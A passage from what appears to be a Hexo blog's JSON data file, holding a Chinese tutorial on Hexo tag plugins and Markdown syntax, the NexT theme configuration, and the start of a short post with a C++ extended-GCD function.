class=\"line\">表头|表头|表头</span><br><span class=\"line\">---|:--:|---:</span><br><span class=\"line\">内容|内容|内容</span><br><span class=\"line\">内容|内容|内容</span><br><span class=\"line\"></span><br><span class=\"line\">第二行分割表头和内容。</span><br><span class=\"line\">- 有一个就行，为了对齐，多加了几个</span><br><span class=\"line\">文字默认居左</span><br><span class=\"line\">-两边加：表示文字居中</span><br><span class=\"line\">-右边加：表示文字居右</span><br><span class=\"line\">注：原生的语法两边都要用 | 包起来。此处省略!</span><br></pre></td></tr></table></figure><br>效果:</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>表头</th>\n<th style=\"text-align:center\">表头</th>\n<th style=\"text-align:right\">表头</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n</tbody>\n</table>\n</div>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":4038,"excerpt":"<h1 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h1><p>标签插件和 <code>Front-matter</code> 中的标签不同，它们是用于在文章中快速插入特定内容的插件。<br>","more":"</p>\n<h2 id=\"引用块\"><a href=\"#引用块\" class=\"headerlink\" title=\"引用块\"></a>引用块</h2><p>在文章中插入引言，可包含作者、来源和标题。<br><strong>别号：</strong> quote</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;</span><br><span class=\"line\">content</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"样例\"><a href=\"#样例\" class=\"headerlink\" title=\"样例\"></a>样例</h3><p><strong>没有提供参数，则只输出普通的 blockquote</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote %&#125;</span><br><span class=\"line\">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</p>\n</blockquote>\n<p><strong>引用书上的句子</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote David Levithan, Wide Awake %&#125;</span><br><span class=\"line\">Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</p>\n<footer><strong>David Levithan</strong><cite>Wide Awake</cite></footer></blockquote>\n<p><strong>引用 Twitter</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote @DevDocs https:&#x2F;&#x2F;twitter.com&#x2F;devdocs&#x2F;status&#x2F;356095192085962752 %&#125;</span><br><span class=\"line\">NEW: DevDocs now comes with syntax highlighting. http:&#x2F;&#x2F;devdocs.io</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>NEW: DevDocs now comes with syntax highlighting. <a href=\"http://devdocs.io\">http://devdocs.io</a></p>\n<footer><strong>@DevDocs</strong><cite><a href=\"https://twitter.com/devdocs/status/356095192085962752\">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote>\n<p><strong>引用网络上的文章</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote Seth Godin http:&#x2F;&#x2F;sethgodin.typepad.com&#x2F;seths_blog&#x2F;2009&#x2F;07&#x2F;welcome-to-island-marketing.html Welcome to Island Marketing %&#125;</span><br><span class=\"line\">Every interaction is both precious and an opportunity to delight.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<blockquote><p>Every interaction is both precious and an opportunity to delight.</p>\n<footer><strong>Seth Godin</strong><cite><a href=\"http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html\">Welcome to Island Marketing</a></cite></footer></blockquote>\n<h2 id=\"代码块\"><a href=\"#代码块\" class=\"headerlink\" title=\"代码块\"></a>代码块</h2><p>在文章中插入代码。</p>\n<p><strong>别名：</strong> code</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class=\"line\">code snippet</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"样例-1\"><a href=\"#样例-1\" class=\"headerlink\" title=\"样例\"></a>样例</h3><p><strong>普通的代码块</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock %&#125;</span><br><span class=\"line\">alert(&#39;Hello World!&#39;);</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(&#39;Hello World!&#39;);</span><br></pre></td></tr></table></figure>\n<p><strong>指定语言</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock lang:objc %&#125;</span><br><span class=\"line\">[rectangle setX: 10 y: 10 width: 20 height: 20];</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight objc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[rectangle setX: <span class=\"number\">10</span> y: <span class=\"number\">10</span> width: <span class=\"number\">20</span> height: <span class=\"number\">20</span>];</span><br></pre></td></tr></table></figure>\n<p><strong>附加说明</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock Array.map %&#125;</span><br><span class=\"line\">array.map(callback[, thisArg])</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>Array.map</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array.map(callback[, thisArg])</span><br></pre></td></tr></table></figure>\n<p><strong>附加说明和网址</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% codeblock _.compact http:&#x2F;&#x2F;underscorejs.org&#x2F;#compact Underscore.js %&#125;</span><br><span class=\"line\">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class=\"line\">&#x3D;&gt; [1, 2, 3]</span><br><span class=\"line\">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>_.compact</span><a href=\"http://underscorejs.org/#compact\">Underscore.js</a></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class=\"line\">&#x3D;&gt; [1, 2, 3]</span><br></pre></td></tr></table></figure>\n<h2 id=\"反引号代码块\"><a href=\"#反引号代码块\" class=\"headerlink\" title=\"反引号代码块\"></a>反引号代码块</h2><p>另一种形式的代码块，不同的是它使用三个反引号来包裹。</p>\n\n&#96`` [language] [title] [url] [link text]\ncode snippet\n&#96;``\n\n<h2 id=\"Pull-Quote\"><a href=\"#Pull-Quote\" class=\"headerlink\" title=\"Pull Quote\"></a>Pull Quote</h2><p>在文章中插入 Pull quote。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% pullquote [class] %&#125;</span><br><span class=\"line\">content</span><br><span class=\"line\">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jsFiddle\"><a href=\"#jsFiddle\" class=\"headerlink\" title=\"jsFiddle\"></a>jsFiddle</h2><p>在文章中嵌入 jsFiddle。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% jsfiddle shorttag [tabs] [skin] [width] [height] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Gist\"><a href=\"#Gist\" class=\"headerlink\" title=\"Gist\"></a>Gist</h2><p>在文章中嵌入 Gist。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% gist gist_id [filename] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"iframe\"><a href=\"#iframe\" class=\"headerlink\" title=\"iframe\"></a>iframe</h2><p>在文章中插入 iframe。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% iframe url [width] [height] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Image\"><a href=\"#Image\" class=\"headerlink\" title=\"Image\"></a>Image</h2><p>在文章中插入指定大小的图片。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% img [class names] &#x2F;path&#x2F;to&#x2F;image [width] [height] [title text [alt text]] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Link\"><a href=\"#Link\" class=\"headerlink\" title=\"Link\"></a>Link</h2><p>在文章中插入链接，并自动给外部链接添加 <code>target=&quot;_blank&quot;</code> 属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% link text url [external] [title] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Include-Code\"><a href=\"#Include-Code\" class=\"headerlink\" title=\"Include Code\"></a>Include Code</h2><p>插入 <code>source</code> 文件夹内的代码文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% include_code [title] [lang:language] path&#x2F;to&#x2F;file %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Youtube\"><a href=\"#Youtube\" class=\"headerlink\" title=\"Youtube\"></a>Youtube</h2><p>在文章中插入 Youtube 视频。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Vimeo\"><a href=\"#Vimeo\" class=\"headerlink\" title=\"Vimeo\"></a>Vimeo</h2><p>在文章中插入 Vimeo 视频。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% vimeo video_id %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"引用文章\"><a href=\"#引用文章\" class=\"headerlink\" title=\"引用文章\"></a>引用文章</h2><p>引用其他文章的链接。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% post_path slug %&#125;</span><br><span class=\"line\">&#123;% post_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"引用资源\"><a href=\"#引用资源\" class=\"headerlink\" title=\"引用资源\"></a>引用资源</h2><p>引用文章的资源。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% asset_path slug %&#125;</span><br><span class=\"line\">&#123;% asset_img slug [title] %&#125;</span><br><span class=\"line\">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Raw\"><a href=\"#Raw\" class=\"headerlink\" title=\"Raw\"></a>Raw</h2><p>如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% raw %&#125;</span><br><span class=\"line\">content</span><br><span class=\"line\">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h1><h2 id=\"标题\"><a href=\"#标题\" class=\"headerlink\" title=\"标题\"></a>标题</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 这是一级标题</span><br><span class=\"line\">## 这是二级标题</span><br><span class=\"line\">### 这是三级标题</span><br><span class=\"line\">#### 这是四级标题</span><br><span class=\"line\">##### 这是五级标题</span><br><span class=\"line\">###### 这是六级标题</span><br></pre></td></tr></table></figure>\n<h2 id=\"字体\"><a href=\"#字体\" class=\"headerlink\" title=\"字体\"></a>字体</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*这是倾斜的文字*</span><br><span class=\"line\">**这是加粗的文字**</span><br><span class=\"line\">***这是斜体加粗的文字***</span><br><span class=\"line\">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure>\n<h2 id=\"引用-1\"><a href=\"#引用-1\" class=\"headerlink\" title=\"引用\"></a>引用</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;这是引用的内容</span><br><span class=\"line\">&gt;&gt;这是引用的内容</span><br><span class=\"line\">&gt;&gt;&gt;这是引用的内容</span><br><span class=\"line\">&gt;&gt;&gt;&gt;这是引用的内容</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<h2 id=\"分割线\"><a href=\"#分割线\" class=\"headerlink\" title=\"分割线\"></a>分割线</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">----</span><br><span class=\"line\">***</span><br><span class=\"line\">*****</span><br><span class=\"line\">然而没什么卵用，效果都一样。</span><br></pre></td></tr></table></figure>\n<h2 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h2><p>语法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">![图片ALT](图片URL &quot;图片title&quot;)</span><br><span class=\"line\">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class=\"line\">图片title是图片的标题，当鼠标移到图片上时显示的内容,可不填。</span><br></pre></td></tr></table></figure><br>效果：<br><img data-src=\"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80\" alt=\"示例图片\" title=\"亦往沧劫\"></p>\n<h2 id=\"超链接\"><a href=\"#超链接\" class=\"headerlink\" title=\"超链接\"></a>超链接</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[显示名称](超链接URL &quot;超链接title&quot;)</span><br><span class=\"line\">title可不加。</span><br></pre></td></tr></table></figure>\n<h2 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h2><p>示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- 无序列表</span><br><span class=\"line\">   1.有序列表</span><br><span class=\"line\">   2.有序列表</span><br><span class=\"line\">- 无序列表</span><br><span class=\"line\">   1.有序列表</span><br><span class=\"line\">   2.有序列表</span><br></pre></td></tr></table></figure><br>效果:</p>\n<ul>\n<li>无序列表<br> 1.有序列表<br> 2.有序列表</li>\n<li>无序列表<br> 1.有序列表<br> 2.有序列表</li>\n</ul>\n<h2 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h2><p>示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">表头|表头|表头</span><br><span class=\"line\">---|:--:|---:</span><br><span class=\"line\">内容|内容|内容</span><br><span class=\"line\">内容|内容|内容</span><br><span class=\"line\"></span><br><span class=\"line\">第二行分割表头和内容。</span><br><span class=\"line\">- 有一个就行，为了对齐，多加了几个</span><br><span class=\"line\">文字默认居左</span><br><span class=\"line\">-两边加：表示文字居中</span><br><span class=\"line\">-右边加：表示文字居右</span><br><span class=\"line\">注：原生的语法两边都要用 | 包起来。此处省略!</span><br></pre></td></tr></table></figure><br>效果:</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>表头</th>\n<th style=\"text-align:center\">表头</th>\n<th style=\"text-align:right\">表头</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n</tbody>\n</table>\n</div>"},{"title":"ExGCD","date":"2019-03-29T09:11:09.000Z","abbrlink":"278aaa5d","updated":"2020-05-11T09:47:17.026Z","_content":"# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\nll exgcd(ll a,ll b,ll &x,ll &y)\n{\n    if(b==0)\n    {\n        x=1,y=0;\n        return a;\n    }\n    else\n    {\n        ll res=exgcd(b,a%b,y,x);\n        y-=x*(a/b);\n        return res;\n    }\n}\n```","source":"_posts/ExGCD.md","raw":"---\ntitle: ExGCD\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - ExGCD\nabbrlink: 278aaa5d\nupdated:\n---\n# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\nll exgcd(ll a,ll b,ll &x,ll &y)\n{\n    if(b==0)\n    {\n        x=1,y=0;\n        return a;\n    }\n    else\n    {\n        ll res=exgcd(b,a%b,y,x);\n        y-=x*(a/b);\n        return res;\n    }\n}\n```","slug":"ExGCD","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkap000sqse5at6hcung","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br><a 